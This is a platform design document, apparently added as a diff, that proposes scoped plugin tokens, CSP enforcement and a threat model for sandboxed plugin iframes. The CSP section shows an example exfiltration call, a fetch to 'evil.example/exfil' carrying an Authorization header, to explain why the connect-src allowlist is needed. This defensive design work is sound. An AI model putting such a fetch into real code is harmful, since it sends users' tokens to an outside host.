@@ -1,0 +1,152 @@
+:showtitle:
+:toc: left
+:numbered:
+:icons: font
+:sidebar-order: 17
+:state: prediscussion
+
+= FUN-17 Plugin Authorization
+
+== Introduction
+
+link:/funs/fun-16[FUN-16] established that plugin UIs run inside sandboxed iframes so that third-party plugin code cannot reach the user's session cookie or the rest of the Console's JavaScript context. That sandbox is the right isolation primitive, but it leaves an open question: how does plugin code inside the sandbox make authenticated API calls? The user's session JWT lives in an `HttpOnly` cookie scoped to the Console origin; the iframe runs on a different origin with `sandbox="allow-scripts"` (no `allow-same-origin`), so even loosening cookie scoping would not help. The plugin literally has no way to read the user's session token.
+
+A second concern surfaces alongside this: even if we *could* hand the user's JWT to the iframe, we shouldn't. The user's JWT carries every organization the user belongs to and every group they're a member of. A cert-manager plugin needs to read Certificate CRs; it does not need permission to delete the organization, manage cluster nodes, or talk to billing endpoints. Giving every plugin the full reach of the user's token violates least-privilege and turns every plugin into a potential confused deputy.
+
+This FUN describes the token model, mint flow, and proxy enforcement that together let plugin code call platform APIs as the user — but only inside the scope the plugin's installation manifest declared and the user consented to.
+
+== Two token types
+
+We introduce a second JWT type alongside the existing user session token. Both are HS256-signed with the same secret, but they are distinguished by the JWT `aud` claim. Every service that validates a JWT declares which audiences it accepts.
+
+`UserToken` (`aud=fundament-user`) is the existing session JWT. It is sent over the wire by the browser (cookie), by `functl` (Bearer), or by API-key exchange. It carries the user's identity (`sub`), the set of organizations they belong to (`organization_ids`), display name, and group memberships. Services that accept it: `authn-api`, `organization-api`, `dcim-api`, `kube-api-proxy`, and the rest of the platform's user-facing surface. Services that *reject* it: `plugin-proxy`'s data path (described below).
+
+`PluginToken` (`aud=fundament-plugin`) is new. It represents a user acting *through a specific plugin installation*. It is short-lived (15 minutes, no refresh — re-mint instead), tightly bound to one cluster and one `PluginInstallation`, and carries an explicit `scopes` claim listing the RBAC rules the plugin is allowed to exercise. Services that accept it: `kube-api-proxy` and `plugin-proxy`. Services that reject it: every other internal API. Crucially, `authn-api`'s `MintPluginToken` endpoint accepts only `UserToken` — a `PluginToken` cannot mint another `PluginToken`. That hard wall keeps the two worlds disjoint.
+
+The `aud` claim is doing real work here. Without it, a plugin holding a PluginToken could replay it against `organization-api/CreateAPIKey` and obtain a long-lived token that bypasses the entire scoping mechanism. With `aud` enforcement, the worst a compromised plugin can do is call the exact set of K8s resources its installation already permits, against the exact cluster it was scoped to, for at most 15 minutes.
+
+== Scoping: user intersect plugin
+
+A PluginToken's effective permissions are the intersection of what the user is allowed to do and what the plugin manifest declared. Two enforcement points realize the intersection.
+
+The plugin-scope half is enforced at the proxy. `kube-api-proxy` parses the K8s URL into `(apiGroup, resource, verb, namespace?)` and matches it against the `scopes` claim of the token. A cert-manager plugin token that lists pods is rejected with 403 before the request reaches the cluster, regardless of who the user is.
+
+The user-permission half is enforced via the existing per-user ServiceAccount token that `kube-api-proxy` injects downstream. That SA token's permissions inside the cluster are exactly the user's project memberships, as today. A request that satisfies the plugin's scope but exceeds the user's project permissions is rejected by the cluster's own RBAC.
+
+The mechanism is deliberately defense-in-depth. Either half failing produces a denial; both halves succeeding produces an allow.
+
+== Where the scope comes from
+
+The plugin's RBAC declaration is part of the `PluginDefinition` manifest. When an organization admin installs a plugin from the marketplace, the install flow copies the declared RBAC into the `PluginInstallation` CR's `spec.permissions.rbac`. This is the *consented* RBAC — the rules the admin agreed to grant when accepting the install. If a future plugin version asks for broader RBAC, the upgrade flow surfaces the diff and requires fresh consent before patching the CR. The spec field, not the running pod, is the source of truth.
+
+When `authn-api` mints a PluginToken, it asks `plugin-proxy` for the manifest of the specified installation. `plugin-proxy` reads the CR from the target cluster and returns the rbac, plugin name, version, and the cluster's organization. `authn-api` embeds those rules directly into the JWT's `scopes` claim. The token is then self-contained: the proxy validates the request against the claim with no extra lookup.
+
+Putting the snapshot on the CR — rather than in a central database — keeps consent state and runtime state in the same place. The plugin lifecycle already lives on the cluster (CR creation, finalizer-driven uninstall, version upgrades); the permissions track that lifecycle naturally. It also avoids a class of bug where the central DB and the CR drift apart.
+
+== Delivering the token to the iframe
+
+The Console is the only party that can mint a PluginToken — it has the user's cookie. The iframe is the only party that needs to *use* the token. We bridge them with a `postMessage` handshake that extends the existing `fundament:init` / `plugin:ready` protocol.
+
+When the Console mounts an iframe, it kicks off a `MintPluginToken` request in parallel with the browser fetching the iframe's `index.html`. When `plugin:ready` arrives from the SDK, the Console awaits the mint and then sends `fundament:init` carrying the freshly-minted token, the theme, and the usual context. Before 80% of the TTL elapses, the Console mints a fresh token and pushes it via `fundament:token-refreshed`. The SDK exposes `fundament.getToken()` — plugins call it whenever they need a Bearer value — and `fundament.fetch()`, a helper that attaches the token and retries once on 401 (to ride out a refresh-vs-call race).
+
+Two subtle but important choices fall out of this protocol.
+
+First, every host-to-iframe `postMessage` call pins the *target origin* to `plugin-proxy`'s origin. The legacy `postMessage(msg, '*')` form is safe against other windows but unsafe if the iframe is ever navigated off its expected origin — at that point, an attacker page would silently receive every subsequent message including the next refreshed token. Pinning the target origin lets the browser refuse delivery on mismatch. The cost is zero because we always know the origin: we constructed the iframe `src` ourselves.
+
+Second, the static plugin UI bundle is served publicly. Plugin asset paths are `(plugin_name, version)`-keyed — `plugin-proxy` serves `/plugins/{name}/{version}/console/*` with no authentication and with `Cache-Control: immutable`. The UI source is no more secret than any other production SPA bundle; the data the JS fetches is what's protected, and that's gated by the PluginToken. Sharing the route across all installations of a version gives us free browser caching: opening cert-manager in cluster A then in cluster B reuses the same bundle.
+
+== The CSP is load-bearing
+
+Sandboxing isolates the iframe from the parent. It does not, on its own, stop the iframe from making outbound network calls to anywhere on the internet. A malicious or compromised plugin holding a PluginToken could `fetch('https://evil.example/exfil', { headers: { Authorization: ... } })` in milliseconds. Sandboxing alone is not enough — we need the browser to refuse the outbound call.
+
+`plugin-proxy` decorates every `/plugins/{name}/{version}/console/*` response with a strict Content-Security-Policy:
+
+[source,text]
+----
+Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' 'unsafe-inline';
+  style-src  'self' 'unsafe-inline';
+  connect-src https://kube-api-proxy.fundament.io
+              https://plugin-proxy.fundament.io;
+  frame-ancestors https://console.fundament.io;
+  base-uri 'none';
+  object-src 'none';
+----
+
+The `connect-src` allowlist is the line that does the work. The plugin's JS can `fetch()` only the two proxies — every other destination is refused by the browser before the request leaves the iframe. The plugin author cannot override this policy because it is a response header set by `plugin-proxy`, outside the plugin's HTML. `frame-ancestors` ensures nobody but the Console can host the iframe in the first place.
+
+`'unsafe-inline'` in `script-src` is a transitional concession to the SDK's current init shape; the longer-term goal is to drop it once the SDK is shipped as a separate file rather than inline.
+
+== Threat model
+
+A few classes of compromise are worth walking through explicitly.
+
+**Compromised plugin code.** This is the marquee case. The plugin sees its PluginToken — that's by design — but it cannot:
+- Replay it against `authn-api`, `organization-api`, `dcim-api`, or any other internal API (`aud` mismatch → 401).
+- Use it for a different installation or a different cluster (claim binding → 403).
+- Use it to mint another PluginToken (escalation wall).
+- Use it past 15 minutes (TTL expiry).
+- Exfiltrate it to `evil.example` (CSP `connect-src` denial).
+
+Within those bounds, a compromised plugin can read and write exactly the resources its installation manifest declares, exactly as the user could have done themselves. That is the irreducible blast radius — a plugin you installed cannot do less than what you let it do.
+
+**Compromised Console JS (XSS).** A successful XSS on the Console origin can call `MintPluginToken` directly using the user's cookie, so it can mint plugin tokens. But this is strictly weaker than the cookie itself, which an XSS on Console origin already controls. The plugin authorization model neither helps nor hurts this case; it relies on the Console's existing XSS hygiene.
+
+**Network interception.** Tokens travel only in TLS-protected channels and only in `Authorization` headers (never in URLs, where they would leak via Referer headers and browser history). Existing TLS posture covers this.
+
+**Postmessage delivery to a wrong-origin page.** Pinned target origin in every host→iframe `postMessage` call. The browser refuses delivery if the iframe was navigated off its expected origin.
+
+== Lifecycle
+
+We rely on short TTL plus mint-time gating rather than a deny-list. Each refresh re-runs the gate:
+
+- The user logs out → cookie cleared → next mint has no `UserToken` → 401 → host emits `fundament:auth-failed`. Live tokens expire on their own within 15 minutes.
+- The user loses cluster access (removed from org or project) → OpenFGA `can_view` returns false on the next mint → 403.
+- The plugin is uninstalled → `GetInstallationManifest` returns `terminating` or `NotFound` → next mint fails. The runtime pod is being torn down regardless.
+- The plugin is upgraded with broader RBAC → admin re-consents → CR `spec.permissions.rbac` is patched → next mint embeds the new scope. Existing live tokens keep the old scope. There is no silent widening.
+- `JWT_SECRET` rotates → every token (both types) is invalidated, same as today.
+
+If a future incident demands sub-TTL revocation (e.g. a known-bad plugin must be killed *now*), we can layer a deny-list keyed by `installation_id` checked at proxy validation time. That stays out of scope for v1.
+
+== Architecture
+
+Two pieces of net-new infrastructure, plus modest changes to existing services.
+
+`authn-api` gains a `TokenService.MintPluginToken` Connect RPC. It validates the caller's `UserToken`, checks OpenFGA for cluster-view authorization, asks `plugin-proxy` for the installation manifest, and signs the PluginToken.
+
+`plugin-proxy` is a new service alongside `kube-api-proxy`. It carries two distinct surfaces:
+
+- *Internal:* a single `PluginInstallationService.GetInstallationManifest` RPC, bound to a cluster-internal Service and restricted by NetworkPolicy to `authn-api`'s ServiceAccount.
+- *Public:* static asset serving at `/plugins/{name}/{version}/console/*` (CSP-decorated, no auth, long cache), and authenticated proxying at `/installations/{id}/runtime/*` (plugin pod) and `/installations/{id}/controller/*` (plugin-controller status). The authenticated routes require a PluginToken whose `installation_id` matches the URL.
+
+`kube-api-proxy` learns to accept both token types. For PluginToken requests it adds two gates: `cluster_id` in the URL must equal `claims.cluster_id`, and the parsed `(apiGroup, resource, verb)` of the K8s request must match an entry in `claims.scopes`. The per-user ServiceAccount injection is unchanged — the plugin still acts as the user inside the cluster, and in-cluster audit continues to show the user as the actor.
+
+`console-frontend` mints the token via Connect, holds it in JS memory, schedules refresh, and delivers it to the iframe via `postMessage`. The Plugin SDK exposes `fundament.getToken()` and `fundament.fetch()` so plugin authors do not deal with token handling directly.
+
+The `PluginInstallation` CRD gains `spec.permissions.rbac` to carry the consented scope.
+
+== Alternatives considered
+
+**Hand the UserToken to the iframe.** Rejected on both grounds the introduction covered: the cookie is `HttpOnly` and the iframe origin is opaque, so JS-level delivery is needed anyway; and the UserToken's blast radius makes this unacceptable even if delivery were technically possible.
+
+**A Backend-for-Frontend that proxies every plugin API call through the Console.** Plugin iframe `postMessage`s every request to the parent, which then makes the real call with its cookie. The Console would enforce what the plugin is allowed to call. Rejected because it couples the plugin tightly to the parent's message bus, breaks every existing K8s client library (which expects to talk to an HTTP endpoint), and pushes a stream of postMessages through a single-threaded JS context for every list/watch.
+
+**Signed one-time URLs for asset loads.** Console asks the backend for a signed URL for `index.html` and uses it as the iframe `src`. Rejected because the assets are not secret — they are SPA bundles. The complexity of signing every sub-resource URL (or maintaining a session cookie for the iframe's plugin-proxy origin) buys nothing the CSP-on-public-assets approach doesn't already deliver.
+
+**Plugin-specific ServiceAccount in the cluster.** Give each plugin its own SA and use it for the plugin's data calls. Rejected because in-cluster RBAC would have to be the union of every user-allowed verb for every user, which is more permissive than any single user. It would also obscure auditing — every plugin call would show up as a generic plugin SA rather than as the user the plugin acted on behalf of.
+
+**OPA / attribute-based authorization on the proxy.** Powerful, but FUN-7 already chose OpenFGA for the relationship-based parts of the model and the plugin scope is a straight subset of Kubernetes RBAC. A second policy engine would add operational surface for marginal benefit.
+
+== Implementation note
+
+A separate design document (`docs/superpowers/specs/2026-05-12-plugin-authorization-design.md`) covers the proto schemas, route shapes, JWT claim layouts, edge cases, and metrics. The implementation is broken into five sequential plans (Plan A through Plan E) covering token foundations, the mint endpoint, the `plugin-proxy` public surface, scope enforcement in `kube-api-proxy`, and the console-and-SDK wiring.
+
+== Related
+
+* link:/funs/fun-3[FUN-3] Security principles — the threat-model framing this FUN extends to plugins.
+* link:/funs/fun-7[FUN-7] User permissions — OpenFGA model and project-level authorization, reused for the cluster-view check at mint time.
+* link:/funs/fun-9[FUN-9] API keys — the existing key-to-JWT exchange flow that the new mint endpoint sits alongside.
+* link:/funs/fun-11[FUN-11] Plugins and the Marketplace — plugin definition format and `PluginInstallation` CR, the carrier for consented RBAC.
+* link:/funs/fun-12[FUN-12] Unauthorized vs Not Found — applied to mint-time denials and proxy-time scope rejections.
+* link:/funs/fun-16[FUN-16] Plugin isolation — the iframe sandboxing this FUN builds on.
